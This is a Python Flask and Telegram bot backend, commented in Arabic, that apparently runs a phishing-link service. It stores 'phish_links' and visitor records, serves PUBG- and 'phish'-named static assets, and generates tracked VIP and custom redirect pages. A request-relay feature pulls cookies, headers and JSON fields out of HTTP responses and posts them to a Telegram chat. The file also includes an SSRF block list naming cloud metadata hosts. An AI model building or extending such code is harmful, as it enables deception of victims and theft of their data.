#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
═══════════════════════════════════════════════════════════════════
        إعدادات قابلة للتعديل - ضع إعداداتك هنا
═══════════════════════════════════════════════════════════════════
"""

import json
import os

def load_env_file(filepath='.env'):
    """قراءة ملف .env إذا كان موجوداً"""
    if os.path.exists(filepath):
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and '=' in line:
                    key, value = line.split('=', 1)
                    key = key.strip()
                    value = value.strip()
                    if key and value:
                        os.environ[key] = value

load_env_file()

ADMIN_ID = os.environ.get('ADMIN_ID', '962731079')

"""
═══════════════════════════════════════════════════════════════════
"""
import tempfile
import secrets
import multiprocessing
import sys
import base64
import gzip
import zlib
import threading
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMemberUpdated
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters, ChatMemberHandler
from PIL import Image
from reportlab.pdfgen import canvas
from flask import Flask, render_template, request, jsonify, send_from_directory, redirect, make_response
import requests
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from functools import wraps
import time
from werkzeug.middleware.proxy_fix import ProxyFix
from database import db

config_file = 'config.json'
blocked_ips_file = 'blocked_ips.json'
rate_limit_tracking_file = 'rate_limit_tracking.json'
device_fingerprints_file = 'device_fingerprints.json'
blocked_fingerprints_file = 'blocked_fingerprints.json'

app = Flask(__name__)

IS_PRODUCTION = os.environ.get('REPL_ID') is not None
ENABLE_HTTPS = os.environ.get('ENABLE_HTTPS', 'false').lower() == 'true'
BEHIND_PROXY = os.environ.get('BEHIND_PROXY', str(IS_PRODUCTION)).lower() == 'true'

if BEHIND_PROXY:
    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', secrets.token_hex(32))
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://",
    strategy="fixed-window"
)

rate_limit_lock = threading.Lock()
blocked_ips_lock = threading.Lock()
blocked_fingerprints_lock = threading.Lock()

def load_rate_limit_tracking():
    with rate_limit_lock:
        if os.path.exists(rate_limit_tracking_file):
            try:
                with open(rate_limit_tracking_file, 'r') as f:
                    content = f.read().strip()
                    if not content:
                        return {}
                    data = json.loads(content)
                    current_time = time.time()
                    cleaned_data = {ip: records for ip, records in data.items() 
                                  if any(t > current_time - 10 for t in records)}
                    return cleaned_data
            except (json.JSONDecodeError, ValueError):
                return {}
        return {}

def save_rate_limit_tracking(tracking_data):
    with rate_limit_lock:
        with open(rate_limit_tracking_file, 'w') as f:
            json.dump(tracking_data, f, indent=2)

def load_device_fingerprints():
    if os.path.exists(device_fingerprints_file):
        try:
            with open(device_fingerprints_file, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_device_fingerprints(fingerprints):
    with open(device_fingerprints_file, 'w') as f:
        json.dump(fingerprints, f, indent=2)

def load_blocked_fingerprints():
    with blocked_fingerprints_lock:
        if os.path.exists(blocked_fingerprints_file):
            try:
                with open(blocked_fingerprints_file, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}

def save_blocked_fingerprints(blocked_fingerprints):
    with blocked_fingerprints_lock:
        with open(blocked_fingerprints_file, 'w') as f:
            json.dump(blocked_fingerprints, f, indent=2)

def get_device_fingerprint():
    user_agent = request.headers.get('User-Agent', '')
    accept_language = request.headers.get('Accept-Language', '')
    accept_encoding = request.headers.get('Accept-Encoding', '')
    accept = request.headers.get('Accept', '')
    
    fingerprint_data = f"{user_agent}|{accept_language}|{accept_encoding}|{accept}"
    
    import hashlib
    fingerprint = hashlib.sha256(fingerprint_data.encode()).hexdigest()
    
    return fingerprint

def is_fingerprint_blocked(fingerprint):
    blocked_fingerprints = load_blocked_fingerprints()
    if fingerprint in blocked_fingerprints:
        block_data = blocked_fingerprints[fingerprint]
        block_until = datetime.fromisoformat(block_data['block_until'])
        if datetime.now() < block_until:
            return True
        else:
            del blocked_fingerprints[fingerprint]
            save_blocked_fingerprints(blocked_fingerprints)
    return False

def track_request_and_block():
    client_ip = get_client_ip()
    device_fingerprint = get_device_fingerprint()
    
    if is_ip_blocked(client_ip):
        return True
    
    if is_fingerprint_blocked(device_fingerprint):
        return True
    
    tracking_key = f"{client_ip}:{device_fingerprint}"
    
    tracking_data = load_rate_limit_tracking()
    current_time = time.time()
    
    if tracking_key not in tracking_data:
        tracking_data[tracking_key] = []
    
    tracking_data[tracking_key] = [t for t in tracking_data[tracking_key] if t > current_time - 10]
    tracking_data[tracking_key].append(current_time)
    
    if len(tracking_data[tracking_key]) > 10:
        device_info = {
            'user_agent': request.headers.get('User-Agent', ''),
            'accept_language': request.headers.get('Accept-Language', ''),
            'accept_encoding': request.headers.get('Accept-Encoding', ''),
        }
        
        blocked_ips = load_blocked_ips()
        blocked_ips[client_ip] = {
            'block_until': (datetime.now() + timedelta(minutes=15)).isoformat(),
            'reason': 'تجاوز معدل الطلبات - أكثر من 10 طلبات في 10 ثواني',
            'timestamp': datetime.now().isoformat(),
            'device_info': device_info
        }
        save_blocked_ips(blocked_ips)
        
        blocked_fingerprints = load_blocked_fingerprints()
        blocked_fingerprints[device_fingerprint] = {
            'block_until': (datetime.now() + timedelta(minutes=15)).isoformat(),
            'reason': 'تجاوز معدل الطلبات - جهاز محظور',
            'timestamp': datetime.now().isoformat(),
            'ip': client_ip,
            'device_info': device_info
        }
        save_blocked_fingerprints(blocked_fingerprints)
        
        save_rate_limit_tracking(tracking_data)
        return True
    
    save_rate_limit_tracking(tracking_data)
    return False

def load_config():
    if os.path.exists(config_file):
        with open(config_file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {'domain': os.environ.get('DOMAIN', 'localhost:13760')}

def save_config(config):
    with open(config_file, 'w', encoding='utf-8') as f:
        json.dump(config, f, indent=2, ensure_ascii=False)

def get_domain():
    domain_from_env = os.environ.get('DOMAIN')
    if domain_from_env:
        return domain_from_env
    config = load_config()
    return config.get('domain', 'localhost:13760')

def load_sessions():
    """تحميل جميع الجلسات من قاعدة البيانات - للتوافقية"""
    cursor = db.get_cursor()
    if cursor is None:
        return {}
    cursor.execute("SELECT * FROM sessions")
    sessions = cursor.fetchall()
    cursor.close()
    result = {}
    for session in sessions:
        session_dict = dict(session)
        result[session_dict['user_id']] = {
            'visits': session_dict.get('visits', 0),
            'last_visit': session_dict.get('last_visit', datetime.now().isoformat()),
            'created_at': session_dict.get('created_at', datetime.now().isoformat()),
            'phish_links': json.loads(session_dict['phish_links']) if session_dict.get('phish_links') else [],
            'visitors': json.loads(session_dict['visitors']) if session_dict.get('visitors') else [],
            'http_requests': json.loads(session_dict['http_requests']) if session_dict.get('http_requests') else [],
            'multi_http_requests': json.loads(session_dict['multi_http_requests']) if session_dict.get('multi_http_requests') else []
        }
    return result

def save_sessions(sessions):
    """حفظ الجلسات في قاعدة البيانات - للتوافقية"""
    cursor = db.get_cursor()
    if cursor is None:
        return
    for user_id, session_data in sessions.items():
        try:
            phish_links_json = json.dumps(session_data.get('phish_links', []))
            visitors_json = json.dumps(session_data.get('visitors', []))
            http_requests_json = json.dumps(session_data.get('http_requests', []))
            multi_http_requests_json = json.dumps(session_data.get('multi_http_requests', []))
            
            cursor.execute("""
                INSERT INTO sessions (user_id, visits, last_visit, created_at, phish_links, visitors, http_requests, multi_http_requests)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ON CONFLICT(user_id) DO UPDATE SET
                    visits = excluded.visits,
                    last_visit = excluded.last_visit,
                    phish_links = excluded.phish_links,
                    visitors = excluded.visitors,
                    http_requests = excluded.http_requests,
                    multi_http_requests = excluded.multi_http_requests
            """, (user_id, 
                  session_data.get('visits', 0), 
                  session_data.get('last_visit', datetime.now().isoformat()),
                  session_data.get('created_at', datetime.now().isoformat()),
                  phish_links_json,
                  visitors_json,
                  http_requests_json,
                  multi_http_requests_json))
        except Exception as e:
            print(f"❌ خطأ في حفظ الجلسة {user_id}: {e}")
    db.conn.commit()
    cursor.close()

def load_users():
    """تحميل جميع المستخدمين من قاعدة البيانات - للتوافقية"""
    cursor = db.get_cursor()
    if cursor is None:
        return {}
    cursor.execute("SELECT * FROM users")
    users = cursor.fetchall()
    cursor.close()
    result = {}
    for user in users:
        user_dict = dict(user)
        vip_links = db.get_user_vip_links(user_dict['user_id'])
        custom_links = db.get_user_custom_links(user_dict['user_id'])
        result[user_dict['user_id']] = {
            'user_id': user_dict['user_id'],
            'username': user_dict.get('username', ''),
            'first_name': user_dict.get('first_name', ''),
            'last_name': user_dict.get('last_name', ''),
            'points': user_dict.get('points', 0),
            'created_at': user_dict.get('created_at', ''),
            'total_visits': user_dict.get('total_visits', 0),
            'vip_links': [
                {
                    'version': vip['version'],
                    'image': vip['image'],
                    'expiry': vip['expiry'],
                    'is_permanent': bool(vip['is_permanent']),
                    'features': json.loads(vip.get('features', '{}'))
                }
                for vip in vip_links
            ],
            'custom_links': [
                {
                    'version': custom['version'],
                    'image': custom['image'],
                    'redirect_link': custom.get('redirect_link', ''),
                    'features': json.loads(custom.get('features', '{}'))
                }
                for custom in custom_links
            ]
        }
    return result

def save_users(users):
    """حفظ المستخدمين في قاعدة البيانات - للتوافقية"""
    cursor = db.get_cursor()
    if cursor is None:
        return
    for user_id, user_data in users.items():
        try:
            cursor.execute("""
                INSERT INTO users (user_id, username, first_name, last_name, points, total_visits, created_at, updated_at, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'), datetime('now'))
                ON CONFLICT(user_id) DO UPDATE SET
                    total_visits = excluded.total_visits,
                    points = excluded.points,
                    updated_at = datetime('now')
            """, (user_id,
                  user_data.get('username', ''),
                  user_data.get('first_name', ''),
                  user_data.get('last_name', ''),
                  user_data.get('points', 0),
                  user_data.get('total_visits', 0),
                  user_data.get('created_at', datetime.now().isoformat())))
            
            if 'vip_links' in user_data and user_data['vip_links']:
                cursor.execute("DELETE FROM vip_links WHERE user_id = ?", (user_id,))
                for vip in user_data['vip_links']:
                    cursor.execute("""
                        INSERT INTO vip_links (user_id, version, image, expiry, is_permanent, features)
                        VALUES (?, ?, ?, ?, ?, ?)
                    """, (user_id, 
                          vip.get('version', 1),
                          vip.get('image', ''),
                          vip.get('expiry'),
                          1 if vip.get('is_permanent', False) else 0,
                          json.dumps(vip.get('features', {}))))
            
            if 'custom_links' in user_data and user_data['custom_links']:
                cursor.execute("DELETE FROM custom_links WHERE user_id = ?", (user_id,))
                for custom in user_data['custom_links']:
                    cursor.execute("""
                        INSERT INTO custom_links (user_id, version, image, redirect_link, features)
                        VALUES (?, ?, ?, ?, ?)
                    """, (user_id,
                          custom.get('version', 1),
                          custom.get('image', ''),
                          custom.get('redirect_link', ''),
                          json.dumps(custom.get('features', {}))))
        except Exception as e:
            print(f"❌ خطأ في حفظ المستخدم {user_id}: {e}")
    db.conn.commit()
    cursor.close()

def load_promo_links():
    """تحميل جميع أكواد البرومو من قاعدة البيانات - للتوافقية"""
    cursor = db.get_cursor()
    if cursor is None:
        return {}
    cursor.execute("SELECT * FROM promo_codes")
    promos = cursor.fetchall()
    cursor.close()
    result = {}
    for promo in promos:
        promo_dict = dict(promo)
        result[promo_dict['code']] = {
            'code': promo_dict['code'],
            'creator_id': promo_dict.get('created_by', ''),
            'reward_points': promo_dict.get('points', 0),
            'max_uses': promo_dict.get('max_uses', 0),
            'uses': promo_dict.get('usage_count', 0),
            'created_at': promo_dict.get('created_at', ''),
            'expires_at': promo_dict.get('expires_at', '')
        }
    return result

def save_promo_links(promo_links):
    """حفظ أكواد البرومو في قاعدة البيانات - للتوافقية"""
    cursor = db.get_cursor()
    if cursor is None:
        return
    for code, promo_data in promo_links.items():
        try:
            cursor.execute("""
                INSERT INTO promo_codes (code, points, max_uses, usage_count, created_by, created_at, expires_at)
                VALUES (?, ?, ?, ?, ?, ?, ?)
                ON CONFLICT(code) DO UPDATE SET
                    points = excluded.points,
                    max_uses = excluded.max_uses,
                    usage_count = excluded.usage_count,
                    expires_at = excluded.expires_at
            """, (code,
                  promo_data.get('reward_points', 0),
                  promo_data.get('max_uses', 0),
                  promo_data.get('uses', 0),
                  promo_data.get('creator_id', ''),
                  promo_data.get('created_at', datetime.now().isoformat()),
                  promo_data.get('expires_at', '')))
        except Exception as e:
            print(f"❌ خطأ في حفظ كود البرومو {code}: {e}")
    db.conn.commit()
    cursor.close()

def load_forced_channels():
    """تحميل القنوات الإجبارية من قاعدة البيانات"""
    channels = db.get_forced_channels()
    result = []
    for ch in channels:
        result.append({
            'channel_id': ch['channel_id'],
            'channel_username': ch['channel_username'],
            'channel_name': ch['channel_name']
        })
    return result

def save_forced_channels(channels):
    """حفظ القنوات الإجبارية في قاعدة البيانات"""
    cursor = db.get_cursor()
    if cursor:
        try:
            cursor.execute("BEGIN TRANSACTION")
            cursor.execute("DELETE FROM forced_channels")
            for ch in channels:
                cursor.execute("""
                    INSERT INTO forced_channels (channel_id, channel_username, channel_name)
                    VALUES (?, ?, ?)
                """, (ch.get('channel_id', ''), ch.get('channel_username', ''), ch.get('channel_name', '')))
            db.conn.commit()
            cursor.close()
        except Exception as e:
            print(f"❌ خطأ في حفظ القنوات: {e}")
            db.conn.rollback()
            cursor.close()

def load_assistant_admins():
    """تحميل الأدمن المساعدين من قاعدة البيانات"""
    admins = db.get_assistant_admins()
    result = {}
    for admin in admins:
        result[admin['user_id']] = {
            'added_at': admin['added_at'],
            'added_by': admin.get('added_by')
        }
    return result

def save_assistant_admins(admins):
    """حفظ الأدمن المساعدين في قاعدة البيانات"""
    cursor = db.get_cursor()
    if cursor:
        try:
            cursor.execute("BEGIN TRANSACTION")
            cursor.execute("DELETE FROM assistant_admins")
            for user_id, data in admins.items():
                cursor.execute("""
                    INSERT INTO assistant_admins (user_id, added_by, added_at)
                    VALUES (?, ?, ?)
                """, (user_id, data.get('added_by'), data.get('added_at', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))))
            db.conn.commit()
            cursor.close()
        except Exception as e:
            print(f"❌ خطأ في حفظ الأدمن: {e}")
            db.conn.rollback()
            cursor.close()

def load_blocked_ips():
    with blocked_ips_lock:
        if os.path.exists(blocked_ips_file):
            with open(blocked_ips_file, 'r') as f:
                return json.load(f)
        return {}

def save_blocked_ips(blocked_ips):
    with blocked_ips_lock:
        with open(blocked_ips_file, 'w') as f:
            json.dump(blocked_ips, f, indent=2)

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr

def is_ip_blocked(ip):
    blocked_ips = load_blocked_ips()
    if ip in blocked_ips:
        block_data = blocked_ips[ip]
        block_until = datetime.fromisoformat(block_data['block_until'])
        if datetime.now() < block_until:
            return True
        else:
            del blocked_ips[ip]
            save_blocked_ips(blocked_ips)
    return False

@app.before_request
def before_request_security():
    static_paths = ['/static/', '/pubg/static/', '/phish_static/', '/vip_images/', '/custom_link_images/']
    if any(request.path.startswith(path) for path in static_paths):
        return
    
    if track_request_and_block():
        blocked_html = """
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>تم حظرك مؤقتاً</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    color: white;
                    text-align: center;
                    padding: 20px;
                }
                .container {
                    background: rgba(0, 0, 0, 0.7);
                    backdrop-filter: blur(15px);
                    padding: 50px;
                    border-radius: 25px;
                    box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
                    max-width: 500px;
                }
                h1 { color: #fff; margin-bottom: 20px; font-size: 2.5em; }
                p { font-size: 18px; line-height: 1.6; margin: 15px 0; }
                .blocked-icon { font-size: 80px; margin-bottom: 20px; }
                .warning { color: #ffeb3b; font-weight: bold; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="blocked-icon">🚫</div>
                <h1>تم حظرك مؤقتاً</h1>
                <p class="warning">⚠️ تم اكتشاف نشاط مشبوه من عنوان IP والجهاز الخاص بك</p>
                <p>السبب: تجاوز معدل الطلبات المسموح به (أكثر من 10 طلبات في 10 ثواني)</p>
                <p>⏱️ مدة الحظر: <strong>15 دقيقة</strong></p>
                <p>⚠️ تم تسجيل معلومات جهازك - استخدام VPN لن يساعد في تجاوز الحظر</p>
                <p>يرجى المحاولة مرة أخرى بعد انتهاء مدة الحظر</p>
            </div>
        </body>
        </html>
        """
        from flask import Response
        return Response(blocked_html, status=429, mimetype='text/html')

@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    
    if ENABLE_HTTPS:
        response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    
    return response

@app.route('/')
def home():
    return render_template('home.html')

@app.route('/p/<page_id>')
def page(page_id):
    sessions = load_sessions()
    
    if page_id not in sessions:
        return "<h1>الرابط غير صحيح أو منتهي الصلاحية</h1>", 404
    
    sessions[page_id]['visits'] = sessions[page_id].get('visits', 0) + 1
    sessions[page_id]['last_visit'] = datetime.now().isoformat()
    save_sessions(sessions)
    
    users = load_users()
    if page_id in users:
        users[page_id]['total_visits'] = users[page_id].get('total_visits', 0) + 1
        save_users(users)
    
    return render_template('page.html', page_id=page_id)

@app.route('/Vip/<int:version>/<page_id>')
def vip_page(version, page_id):
    sessions = load_sessions()
    users = load_users()
    
    if page_id not in users or 'vip_links' not in users[page_id]:
        return "<h1>رابط VIP غير مكتمل الإعداد</h1>", 404
    
    if page_id not in sessions:
        sessions[page_id] = {
            'user_id': page_id,
            'visits': 0,
            'created_at': datetime.now().isoformat()
        }
        save_sessions(sessions)
    
    vip_links = users[page_id]['vip_links']
    vip_data = None
    
    for vip in vip_links:
        if vip.get('version') == version:
            vip_data = vip
            break
    
    if not vip_data:
        return "<h1>رابط VIP غير موجود</h1>", 404
    
    if not vip_data.get('is_permanent', False):
        if 'expiry' in vip_data:
            expiry_date = datetime.fromisoformat(vip_data['expiry'])
            if datetime.now() > expiry_date:
                expired_html = f"""
                <!DOCTYPE html>
                <html lang="ar" dir="rtl">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>انتهت صلاحية VIP</title>
                    <style>
                        body {{
                            font-family: Arial, sans-serif;
                            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                            min-height: 100vh;
                            display: flex;
                            justify-content: center;
                            align-items: center;
                            color: white;
                            text-align: center;
                            padding: 20px;
                        }}
                        .container {{
                            background: rgba(0, 0, 0, 0.6);
                            backdrop-filter: blur(15px);
                            padding: 50px;
                            border-radius: 25px;
                            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
                            max-width: 500px;
                        }}
                        h1 {{ color: #FFD700; margin-bottom: 20px; }}
                        p {{ font-size: 18px; line-height: 1.6; margin: 15px 0; }}
                        .expired-icon {{ font-size: 80px; margin-bottom: 20px; }}
                        .info {{ background: rgba(255, 215, 0, 0.2); padding: 15px; border-radius: 10px; margin: 20px 0; }}
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="expired-icon">⏰</div>
                        <h1>انتهت صلاحية VIP</h1>
                        <p>عذراً، انتهت صلاحية رابط VIP هذا</p>
                        <div class="info">
                            <p>📅 انتهت الصلاحية في:<br>{expiry_date.strftime('%Y-%m-%d %H:%M')}</p>
                        </div>
                        <p>💡 للحصول على رابط VIP جديد، تواصل مع البوت</p>
                    </div>
                </body>
                </html>
                """
                return expired_html, 403
    
    sessions[page_id]['visits'] = sessions[page_id].get('visits', 0) + 1
    sessions[page_id]['last_visit'] = datetime.now().isoformat()
    save_sessions(sessions)
    
    users[page_id]['total_visits'] = users[page_id].get('total_visits', 0) + 1
    save_users(users)
    
    vip_image_path = vip_data.get('image', '')
    redirect_link = vip_data.get('redirect_link', 'https://t.me')
    
    return render_template('vip.html', 
                         page_id=page_id, 
                         vip_image=vip_image_path,
                         redirect_link=redirect_link)

@app.route('/Custom/<int:version>/<page_id>')
def custom_page(version, page_id):
    client_ip = get_client_ip()
    
    if is_ip_blocked(client_ip):
        blocked_html = """
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>تم حظرك</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    color: white;
                    text-align: center;
                    padding: 20px;
                }
                .container {
                    background: rgba(0, 0, 0, 0.6);
                    backdrop-filter: blur(15px);
                    padding: 50px;
                    border-radius: 25px;
                    box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
                    max-width: 500px;
                }
                h1 { color: #fff; margin-bottom: 20px; font-size: 2.5em; }
                p { font-size: 18px; line-height: 1.6; margin: 15px 0; }
                .blocked-icon { font-size: 80px; margin-bottom: 20px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="blocked-icon">🚫</div>
                <h1>تم حظرك من الدخول</h1>
                <p>عذراً، تم حظر عنوان IP والجهاز الخاص بك مؤقتاً</p>
                <p>⚠️ تم تسجيل بصمة جهازك - لا يمكن التحايل على الحظر</p>
                <p>برجاء الدخول مرة أخرى بعد 15 دقيقة</p>
            </div>
        </body>
        </html>
        """
        return blocked_html, 403
    
    sessions = load_sessions()
    users = load_users()
    
    if page_id not in users or 'custom_links' not in users[page_id]:
        return "<h1>رابط خاص غير مكتمل الإعداد</h1>", 404
    
    if page_id not in sessions:
        sessions[page_id] = {
            'user_id': page_id,
            'visits': 0,
            'created_at': datetime.now().isoformat()
        }
        save_sessions(sessions)
    
    custom_links = users[page_id]['custom_links']
    custom_data = None
    
    for custom in custom_links:
        if custom.get('version') == version:
            custom_data = custom
            break
    
    if not custom_data:
        return "<h1>رابط خاص غير موجود</h1>", 404
    
    sessions[page_id]['visits'] = sessions[page_id].get('visits', 0) + 1
    sessions[page_id]['last_visit'] = datetime.now().isoformat()
    save_sessions(sessions)
    
    users[page_id]['total_visits'] = users[page_id].get('total_visits', 0) + 1
    save_users(users)
    
    custom_image_path = custom_data.get('image', '')
    redirect_link = custom_data.get('redirect_link', 'https://t.me')
    features = custom_data.get('features', {})
    
    return render_template('custom.html', 
                         page_id=page_id, 
                         custom_image=custom_image_path,
                         redirect_link=redirect_link,
                         features=features)

def is_url_safe(url):
    """التحقق من أن الـ URL آمن وليس SSRF"""
    from urllib.parse import urlparse
    import ipaddress
    import socket
    
    try:
        parsed = urlparse(url)
        hostname = parsed.hostname
        
        if not hostname:
            return False
        
        blocked_domains = [
            'localhost', '127.0.0.1', '0.0.0.0', 
            '169.254.169.254', 
            'metadata.google.internal',
            'instance-data',
            'metadata.azure.com'
        ]
        
        if hostname.lower() in blocked_domains:
            return False
        
        if hostname.startswith('10.') or hostname.startswith('192.168.'):
            return False
        
        if hostname.startswith('172.'):
            try:
                second_octet = int(hostname.split('.')[1])
                if 16 <= second_octet <= 31:
                    return False
            except:
                pass
        
        try:
            ip = ipaddress.ip_address(hostname)
            if ip.is_private or ip.is_loopback or ip.is_link_local:
                return False
        except ValueError:
            try:
                resolved_ips = socket.getaddrinfo(hostname, None)
                for ip_info in resolved_ips:
                    ip_str = ip_info[4][0]
                    ip = ipaddress.ip_address(ip_str)
                    if ip.is_private or ip.is_loopback or ip.is_link_local:
                        return False
            except Exception as e:
                print(f"⚠️ خطأ في DNS resolution لـ {hostname}: {e}")
                return False
        
        return True
    except Exception as e:
        print(f"⚠️ خطأ في التحقق من أمان الـ URL: {e}")
        return False

def decode_response_content(response):
    """
    فك تشفير محتوى الرد HTTP تلقائياً وتنظيفه من أي أحرف غريبة
    يدعم: gzip, deflate, br (brotli), base64
    """
    try:
        content = response.content
        
        if len(content) > 2 and content[0:2] == b'\x1f\x8b':
            try:
                decompressed_content = gzip.decompress(content)
                text = decompressed_content.decode('utf-8')
                print("✅ تم فك ضغط gzip بنجاح (magic bytes)")
                return text
            except Exception as e:
                print(f"⚠️ فشل فك ضغط gzip رغم وجود magic bytes: {e}")
        
        try:
            text = content.decode('utf-8')
            if not text.startswith('aQ') and '<' in text:
                return text
        except UnicodeDecodeError:
            pass
        
        try:
            decompressed_content = gzip.decompress(content)
            text = decompressed_content.decode('utf-8')
            print("✅ تم فك ضغط gzip بنجاح")
            return text
        except Exception as e:
            print(f"⚠️ محاولة gzip فشلت: {e}")
        
        try:
            decompressed_content = zlib.decompress(content)
            text = decompressed_content.decode('utf-8')
            print("✅ تم فك ضغط deflate بنجاح")
            return text
        except Exception as e:
            print(f"⚠️ محاولة deflate فشلت: {e}")
        
        try:
            decompressed_content = zlib.decompress(content, -zlib.MAX_WBITS)
            text = decompressed_content.decode('utf-8')
            print("✅ تم فك ضغط deflate (raw) بنجاح")
            return text
        except Exception as e:
            print(f"⚠️ محاولة deflate raw فشلت: {e}")
        
        try:
            import brotli
            decompressed_content = brotli.decompress(content)
            text = decompressed_content.decode('utf-8')
            print("✅ تم فك ضغط brotli بنجاح")
            return text
        except:
            pass
        
        try:
            text = content.decode('latin-1')
            return text
        except:
            pass
        
        try:
            text = content.decode('iso-8859-1')
            return text
        except:
            pass
        
        try:
            return response.text
        except:
            print(f"⚠️ جميع محاولات فك الضغط فشلت، عرض البيانات الخام")
            return str(content[:1000])
        
    except Exception as e:
        print(f"⚠️ خطأ في فك تشفير الرد: {e}")
        try:
            return response.text
        except:
            return str(response.content)

def extract_extractable_fields(response, decoded_response):
    """
    استخراج جميع الحقول القابلة للسحب من Response (JSON + Cookies + Headers)
    """
    extractable_fields = {}
    extractable_fields_display = {}
    
    try:
        try:
            json_data = json.loads(decoded_response)
            if isinstance(json_data, dict):
                def flatten_dict(d, prefix=''):
                    for key, value in d.items():
                        full_key = f"{prefix}.{key}" if prefix else key
                        if isinstance(value, dict):
                            flatten_dict(value, full_key)
                        elif isinstance(value, list):
                            extractable_fields[full_key] = json.dumps(value, ensure_ascii=False)[:2000]
                            extractable_fields_display[full_key] = f"[Array with {len(value)} items]"
                        else:
                            extractable_fields[full_key] = str(value)
                            extractable_fields_display[full_key] = str(value)
                
                flatten_dict(json_data)
        except:
            pass
        
        if response.cookies:
            for cookie_name, cookie_value in response.cookies.items():
                extractable_fields[f"cookie.{cookie_name}"] = str(cookie_value)
                extractable_fields_display[f"cookie.{cookie_name}"] = str(cookie_value)
        
        important_headers = ['set-cookie', 'location', 'content-type', 'server', 'x-powered-by']
        for header_name in important_headers:
            if header_name in response.headers:
                extractable_fields[f"header.{header_name}"] = response.headers[header_name]
                extractable_fields_display[f"header.{header_name}"] = response.headers[header_name]
    
    except Exception as e:
        print(f"خطأ في استخراج الحقول: {e}")
    
    return {'fields': extractable_fields, 'display': extractable_fields_display}

def send_response_to_telegram(bot_token, user_id, request_data, response, decoded_response):
    """
    إرسال الرد إلى التليجرام. إذا كان الرد أكثر من 150 سطر، يتم حفظه في ملف وإرساله.
    """
    try:
        lines = decoded_response.split('\n')
        line_count = len(lines)
        
        base_message = f"""
🌐 تم تنفيذ طلب HTTP من الرابط الديناميكي!

📊 معلومات الطلب:
━━━━━━━━━━━━━━━━
🔧 Method: {request_data['method']}
🌐 URL: {request_data['url']}
📊 Status Code: {response.status_code}

🔗 Headers المستخدمة:
━━━━━━━━━━━━━━━━
📍 Origin: {request_data.get('successful_origin', 'N/A')}
📍 Referer: {request_data.get('successful_referer', 'N/A')}

⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        
        if line_count > 150:
            if not os.path.exists('temp_responses'):
                os.makedirs('temp_responses')
            
            filename = f"response_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{secrets.token_hex(4)}.txt"
            filepath = os.path.join('temp_responses', filename)
            
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(decoded_response)
            
            message_with_file_info = base_message + f"""
📊 عدد الأسطر: {line_count} سطر

📄 الرد كبير جداً! تم حفظه في ملف وسيتم إرساله...
"""
            
            telegram_api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            requests.post(telegram_api_url, json={
                'chat_id': user_id,
                'text': message_with_file_info
            }, timeout=10)
            
            telegram_file_url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            with open(filepath, 'rb') as f:
                requests.post(telegram_file_url, 
                            data={'chat_id': user_id, 'caption': f'📄 الرد الكامل ({line_count} سطر)'},
                            files={'document': f},
                            timeout=30)
            
            try:
                os.remove(filepath)
            except:
                pass
            
            return True
        else:
            response_preview = decoded_response[:500] if decoded_response else 'فارغ'
            full_message = base_message + f"""
📄 Response (أول 500 حرف):
━━━━━━━━━━━━━━━━
{response_preview}{'...' if len(decoded_response) > 500 else ''}
"""
            
            telegram_api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            requests.post(telegram_api_url, json={
                'chat_id': user_id,
                'text': full_message
            }, timeout=10)
            
            return True
            
    except Exception as e:
        print(f"❌ خطأ في إرسال الرسالة للبوت: {e}")
